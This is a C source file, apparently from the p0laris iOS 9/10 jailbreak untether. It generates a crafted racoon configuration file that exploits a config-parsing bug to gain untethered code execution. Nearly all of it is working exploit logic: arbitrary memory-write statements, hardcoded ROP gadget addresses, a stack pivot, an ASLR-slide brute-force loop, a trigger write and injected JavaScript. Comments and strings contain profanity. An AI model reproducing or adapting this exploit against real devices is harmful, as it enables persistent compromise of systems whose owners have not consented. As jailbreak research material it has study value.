/*
 *  drunk_rac00n
 *  untethered code execution on iOS 9 and 10, by exploiting the rocky racoon
 *  config file bug. then ROP the shit out of racoon, and it remains to be seen
 *  what will be done after that. UPDATE THIS COMMENT!!!
 */

#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

#include "stage1_primitives.h"
#include "stage0_primitives.h"
#include "patchfinder.h"
#include "stage2.h"
#include "ip_tools.h"
#include "common.h"
#include "shit.h"

uint32_t DNS4_OFFSET;
uint32_t LC_CONF_OFFSET;

// https://opensource.apple.com/source/Libc/Libc-825.26/string/FreeBSD/memmem.c.auto.html
void *
memmem(const void *l, size_t l_len, const void *s, size_t s_len)
{
	register char *cur, *last;
	const char *cl = (const char *)l;
	const char *cs = (const char *)s;

	/* we need something to compare */
	if (l_len == 0 || s_len == 0)
		return NULL;

	/* "s" must be smaller or equal to "l" */
	if (l_len < s_len)
		return NULL;

	/* special case where s_len == 1 */
	if (s_len == 1)
		return memchr(l, (int)*cs, l_len);

	/* the last position where its possible to find "s" in "l" */
	last = (char *)cl + l_len - s_len;

	for (cur = (char *)cl; cur <= last; cur++)
		if (cur[0] == cs[0] && memcmp(cur, cs, s_len) == 0)
			return cur;

	return NULL;
}

char* fuck_memory_leaks = NULL;

FILE* fp = NULL;

void help(void) {
	fprintf(stderr,
			"usage: %s [-f /path/to/racoon] [-o /path/to/output/conf]\n",
			getprogname());
}

void hexdump_to_stderr(void* what, size_t len, int cols, int col_split) {
	uint8_t* new_what = (uint8_t*)what;
	for (new_what = (uint8_t*)what; new_what < (what + len); new_what += (cols * col_split)) {
		fprintf(stderr, "0x016%llx: ", new_what);
		for (uint8_t* j = new_what; j < (new_what + (cols * col_split)); j += col_split) {
			for (uint8_t* k = j; k < (j + col_split); k++) {
				uint8_t val = *k;
				if (new_what < (what + len)) {
					fprintf(stderr, "%02x", val);
				} else {
					fprintf(stderr, "  ");
				}
			}

			fprintf(stderr, " ");
		}
		
		for (uint8_t* j = new_what; j < (new_what + (cols * col_split)); j++) {
			uint8_t val = *j;
			if (val < 0x20 || val >= 0x80) {
				val = 0x2e;
			}

			fprintf(stderr, "%c", val);
		}

		fprintf(stderr, "\n");
	}
}

void prim_hexdump_to_stderr(void* what, size_t len) {
	for (uint8_t* new_what = (uint8_t*)what; new_what < (what + len); new_what++) {
		fprintf(stderr, "%02x", *new_what);
	}

	fprintf(stderr, "\n");
}

int main(int   argc,
		 char* argv[]) {
	uint8_t* buf      = NULL;
	size_t   sz	      = -1;
	char*    bin_path = NULL;
	char*    js_path  = NULL;
	char*    js_src	  = NULL;
	FILE*    bin      = NULL;
	FILE*    js       = NULL;
	bool     had_f    = false;
	bool     had_j    = false;
	int      c        = -1;

	fp = stdout;

	fuck_memory_leaks = (char*)malloc(1048576);

	if (argc < 2) {
		help();
		return -1;
	}

	while ((c = getopt(argc, argv, "hf:o:j:")) != -1) {
		switch (c) {
			case 'o':
				fp = fopen(optarg, "w");
				break;
			case 'f':
				bin_path = strdup(optarg);
				had_f = true;
				break;
			case 'j':
				js_path = strdup(optarg);
				had_j = true;
				break;
			case 'h':
				help();
				return -1;
			default:
				help();
				return -1;
		}
	}

	if (!bin_path) {
#if 0
		fprintf(stderr,
				had_f ? "error: failed to open racoon binary...\n"
					  : "error: racoon binary unspecified.\n");
		return -1;
#endif
		bin = fopen("/usr/sbin/racoon", "rb");
	} else {
		bin = fopen(bin_path, "rb");
	}

	if (!had_j) {
#if 0
		fprintf(stderr,
				had_j ? "error: failed to open JS code...\n"
					  : "error: JS code unspecified.\n");
		return -1;
#endif
		js = fopen("lol.js", "rb");
	} else {
		js = fopen(js_path, "rb");
	}

	fseek(js, 0L, SEEK_END);
	sz = ftell(js);
	rewind(js);

	js_src = (char*)malloc(sz);
	fread(js_src, 1, sz, js);

	fseek(bin, 0L, SEEK_END);
	sz = ftell(bin);
	rewind(bin);

	buf = (uint8_t*)malloc(sz);
	fread(buf, 1, sz, bin);
	DNS4_OFFSET = find_dns4_offset(0, buf, sz);
	LC_CONF_OFFSET = find_lc_conf_offset(0, buf, sz);
	free(buf);

	fprintf(stderr, "we out here\n");

	fprintf(fp, "# drunk_rac00n exploit by @__spv\n");
	fprintf(fp, "# this file is auto-generated by the p0laris untether,\n");
	fprintf(fp, "# do not edit or delete!!!\n");
	fprintf(fp, "# DNS4_OFFSET=0x%x\n", DNS4_OFFSET);
	fprintf(fp, "# LC_CONF_OFFSET=0x%x\n", LC_CONF_OFFSET);
	fprintf(fp, "# bin_path=\"%s\"\n", bin_path);
	fprintf(fp, "# compiled on %s at %s by \"%s\", by %s in \"%s\"\n",
				__DATE__,
				__TIME__,
				__VERSION__,
				__WHOAMI__,
				__PWD__);
	fprintf(fp, "#   - with love from spv <3\n");
	fprintf(fp, "\n");

	uint32_t	stack_base					= 0x1c7738; // my shell setup
//	uint32_t	stack_base					= 0x1c7c88; // my 4s shell setup
//	uint32_t	stack_base					= 0x1c2e48; // my lldb
//	uint32_t	stack_base					= 0x1c7d68; // btserver env
//	uint32_t	stack_base					= 0x1c7dd8; // wifiFirmwareLoader env
	uint32_t	magic_trigger_addr			= 0xb6074;

	uint32_t	mov_r0_0_bx_lr				= 0x8d3e	| 1;
	uint32_t	pop_r4_to_r7_pc				= 0x781a	| 1;
	uint32_t	mov_r0						= 0xee40	| 1;
	uint32_t	puts_addr					= 0x9ac54;
	uint32_t	blx_r5						= 0x13012	| 1;
	uint32_t	malloc_addr					= 0x9abdc;
	uint32_t	mov_r1_r0					= 0x72f76	| 1;
	uint32_t	nop							= 0x781a	| 1;
	uint32_t	printf_addr					= 0x9ac30;
	uint32_t	exit_addr					= 0x9a9a8;
	uint32_t	str_r0_r4					= 0x85474	| 1;
	uint32_t	ldr_r0_r0					= 0x397dc	| 1;
	uint32_t	add_r0_r1					= 0x75cca	| 1;
	uint32_t	pivot_addr					= 0x75f18	| 1;
	uint32_t	pivot_to					= 0x100000;
	uint32_t	weird_r3					= 0x75a3c	| 1;
	uint32_t	other_weird_r3				= 0x8806	| 1;

#if 0
	fprintf(stderr, "PRE: mov_r0_0_bx_lr:  0x%08x\n", mov_r0_0_bx_lr);
	fprintf(stderr, "PRE: pop_r4_to_r7_pc: 0x%08x\n", pop_r4_to_r7_pc);

	mov_r0_0_bx_lr	= (get_offset_to_binary_of_bytes(buf, sz, (uint8_t*)"\x70\x47\x00\x20\x70\x47", 6) + 0x4002) | 1;
	pop_r4_to_r7_pc	= (get_offset_to_binary_of_bytes(buf, sz, (uint8_t*)"\x01\xb0\xf0\xbd", 4) + 0x4002) | 1;
	mov_r0			= (get_offset_to_binary_of_bytes(buf, sz, (uint8_t*)"\x20\x46\xf0\xbd", 4) + 0x4000) | 1;
//	puts_addr		= 

	fprintf(stderr, "POST: mov_r0_0_bx_lr:  0x%08x\n", mov_r0_0_bx_lr);
	fprintf(stderr, "POST: pop_r4_to_r7_pc: 0x%08x\n", pop_r4_to_r7_pc);
#endif

//	fprintf(stderr, "0x%08x\n", find_printf_addr(0, buf, sz));
//	fprintf(stderr, "0x%08x\n", find_puts_addr(0, buf, sz));

	uint32_t	scprefcreate_lazy_offset	= 0xb4140;
	uint32_t	scprefcreate_dsc_offset		= 0xce2065;

	uint32_t	we_out_here_addr			= 0x1c5000;
	uint32_t	malloc_status_addr			= 0x1c5100;
	uint32_t	dyld_status_addr			= 0x1c5200;
	uint32_t	dyld_status2_addr			= 0x1c5300;
	uint32_t	jsc_addr					= 0x1c5400;
	uint32_t	dlopen_status_addr			= 0x1c5500;
	uint32_t	dyld_shc_status_addr		= 0x1c5600;
	uint32_t	reserve_addr				= 0x1a0000;
	uint32_t	nulls_addr					= 0x5000;
	uint32_t	time_addr					= 0x1c5700;
	uint32_t	arg_addr					= 0x1c5800;

#if 0
	for (int blaze = 0x1c7700; blaze < 0x1c8000; blaze += 4) {
		fprintf(fp, "%s", write32_slid(blaze, 0x41000000 | blaze));
	}

	fprintf(fp,
			"%s",
			write32_slid(magic_trigger_addr,
						   0x13371337));

	/*
	 *  dummy statement to run inet_pton to attempt the trigger if correct
	 *  slide
	 */
	fprintf(fp,
			"mode_cfg{"
			"dns41.1.1.1;"
			"}");

	/*
	 *  bail if the slide is wrong
	 */
	fprintf(fp,
			"%s\n",
			write32_unslid(0x41414141,
						   0x42424242));
#endif

	fprintf(fp, "%s\n", write32_unslid(stack_base - 0x948, 0x41414141));
	fprintf(fp, "mode_cfg{dns41.1.1.1;}");

#if 0
//	fprintf(fp,
//			"%s\n",
//			write32_unslid(0x41414141,
//						   0x42424242));
	uint32_t guessed_slide = 0x1000;

	for (uint32_t x = 0x1c7800; x < 0x1c8000; x += 4) {
		fprintf(fp, "%s", write32_unslid(x + guessed_slide, 0x41000000 | x));
	}

		/*
		 *  trigger if right slide
		 *
		 *  this trigger is kinda magic to me, basically it's writing to some
		 *  error or status variable that the YACC/bison internal shit uses or
		 *  something, and writing some different val makes it think there was
		 *  and error or some shit, idk
		 */
		fprintf(fp,
				"%s",
				write32_unslid(guessed_slide + magic_trigger_addr,
							   0x13371337));

		/*
		 *  dummy statement to run inet_pton to attempt the trigger if correct
		 *  slide
		 */
		fprintf(fp,
				"mode_cfg{"
				"dns41.1.1.1;"
				"}");

	/*
	 *  bail if the slide is wrong
	 */
	fprintf(fp,
			"%s\n",
			write32_unslid(0x41414141,
						   0x42424242));
#endif
								
	fprintf(fp,
			"%s",
			writebuf_unslid(0x108000,
							"var parent = new Uint8Array(0x100);"
							"var child = new Uint8Array(0x100);"
							"    var fuck = new Array();"
							"    for (var i = 0; i < 0x200000; i++) {"
							"        fuck[i] = i;"
							"    }"
							"    delete fuck;"
							""
							"//shitalloc();",
							strlen("var parent = new Uint8Array(0x100);"
								   "var child = new Uint8Array(0x100);"
								   "    var fuck = new Array();"
								   "    for (var i = 0; i < 0x200000; i++) {"
								   "        fuck[i] = i;"
								   "    }"
								   "    delete fuck;"
								   ""
								   "//shitalloc();") + 1));
	fprintf(fp,
			"%s",
			writebuf_unslid(0x10a000,
							js_src,
							strlen(js_src) + 1));
	
	fprintf(fp,
			"%s",
			writebuf_unslid(0x109000,
							"still alive\n",
							strlen("still alive\n") + 1));

	for (int slide = 0x1; slide <= 0x3; slide++) {
		uint32_t base = slide << 12;
		uint32_t slid_stack = stack_base + base;

		char* we_out_here_str = NULL;
		asprintf(&we_out_here_str,
				 "[*] drunk_rac00n exploit by spv. aslr_slide=0x%x\n"
				 "[*] ROP 'til you die motherfuckers.",
				 slide);

		fprintf(fp,
				"%s",
				writebuf_unslid(base + we_out_here_addr,
								we_out_here_str,
								strlen(we_out_here_str) + 1));

		fprintf(fp,
				"%s",
				writebuf_unslid(base + malloc_status_addr,
								"[*] malloc(...)\t\t\t= %p\n",
								strlen("[*] malloc(...)\t\t\t= %p\n") + 1));

		fprintf(fp,
				"%s",
				writebuf_unslid(base + dyld_shc_status_addr,
								"[*] dyld_shared_cache base\t= %p\n",
								strlen("[*] dyld_shared_cache base\t= %p\n") + 1));
		fprintf(fp,
				"%s",
				writebuf_unslid(base + time_addr,
								"[*] time\t\t\t= %d\n",
								strlen("[*] time\t\t\t= %d\n") + 1));
		fprintf(fp,
				"%s",
				writebuf_unslid(base + arg_addr,
								"/untether/p0laris",
								strlen("/untether/p0laris") + 1));

		rop_chain_shit	chain_b0i	= gen_rop_chain(base,
													we_out_here_addr,
													mov_r0,
													puts_addr,
													blx_r5,
													nulls_addr,
													malloc_addr,
													mov_r1_r0,
													nop,
													malloc_status_addr,
													printf_addr,
													exit_addr,
													str_r0_r4,
													reserve_addr,
													ldr_r0_r0,
													add_r0_r1,
													pivot_to + 0x10,
													dyld_shc_status_addr,
													scprefcreate_dsc_offset,
													scprefcreate_lazy_offset,
													weird_r3,
													other_weird_r3);

//		prim_hexdump_to_stderr(chain_b0i->teh_chain, chain_b0i->chain_len);
		
		fprintf(fp,
				"\n\n# rop_chain length %d bytes (0x%x bytes hex), ASLR slide=0x%x, slid_base=0x%x\n",
				chain_b0i->chain_len,
				chain_b0i->chain_len,
				(slide),
				(slide << 12) + 0x4000);

#if 0
		for (int val = 0; val < (chain_b0i->chain_len / 4); val++) {
			fprintf(fp,
					"%s",
					write32_unslid(slid_stack + (val * 4),
								   chain_b0i->teh_chain[val]));
		}
#endif

		fprintf(fp, "%s", write32_unslid(slid_stack + 0x0, pivot_to));
		fprintf(fp, "%s", write32_unslid(slid_stack + 0x4, 0x41414141));
		fprintf(fp, "%s", write32_unslid(slid_stack + 0x8, 0x41414141));
		fprintf(fp, "%s", write32_unslid(slid_stack + 0xc, 0x41414141));
		fprintf(fp, "%s", write32_unslid(slid_stack + 0x10, base + pivot_addr));
		fprintf(fp, "%s", write32_unslid(pivot_to + 0x0, 0x41414141));
		fprintf(fp, "%s", write32_unslid(pivot_to + 0x4, 0x41414141));
		fprintf(fp, "%s", write32_unslid(pivot_to + 0x8, 0x41414141));
		fprintf(fp, "%s", write32_unslid(pivot_to + 0xc, base + nop));

		/*
		 *  use writebuf_unslid as it uses like 1/6th of the statements
		 */
		fprintf(fp,
				"%s",
				writebuf_unslid(pivot_to + 0x10,
								(char*)chain_b0i->teh_chain,
								chain_b0i->chain_len));
		
//		prim_hexdump_to_stderr(chain_b0i->teh_chain, chain_b0i->chain_len);

		/*
		 *  trigger if right slide
		 *
		 *  this trigger is kinda magic to me, basically it's writing to some
		 *  error or status variable that the YACC/bison internal shit uses or
		 *  something, and writing some different val makes it think there was
		 *  and error or some shit, idk
		 */
		fprintf(fp,
				"%s",
				write32_unslid(base + magic_trigger_addr,
							   0x13371337));

		/*
		 *  dummy statement to run inet_pton to attempt the trigger if correct
		 *  slide
		 */
		fprintf(fp,
				"mode_cfg{"
				"dns41.1.1.1;"
				"}");

		/*
		 *  we don't need no memory leaks round these parts
		 */
		free(chain_b0i->teh_chain);
	}

	/*
	 *  bail if the slide is wrong
	 */
	fprintf(fp,
			"%s\n",
			write32_unslid(0x41414141,
						   0x42424242));
	
	free(js_src);
	free(fuck_memory_leaks);

//	getc(stdin);

	return 0;
}
